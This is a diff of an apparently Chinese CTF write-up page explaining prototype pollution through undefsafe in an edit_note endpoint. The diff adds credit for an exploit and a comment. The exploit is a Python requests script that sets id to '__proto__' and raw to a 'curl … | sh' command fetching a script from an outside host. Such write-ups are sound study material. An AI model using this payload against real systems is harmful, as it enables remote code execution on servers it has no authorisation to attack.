@@ -229,8 +229,10 @@ edit_note(id, author, raw) {
 </code></pre>
 <p>这里先接受了post的一个author和raw和id<br>
 然后传入Edit_note函数。这里使用了undefsafe函数。<br>
-如果id传为为<code>__proto__</code>就存在参数链污染</p>
+如果id传为为<code>__proto__</code>就存在参数链污染<br>
+以下是114师傅的EXP</p>
 <pre><code>a = {'raw': 'curl http://tjxnb.com/1.html | sh', 'id': '__proto__', 'author': 'test'}
+#只需要id为__proto__。其他随意
 import requests
 url = &quot;http://f13d06664e32474aad611a68000b395fba21a904678b4e4a.cloudgame2.ichunqiu.com:8080/&quot;
 print(requests.post(url+&quot;edit_note&quot;,json=a).text);
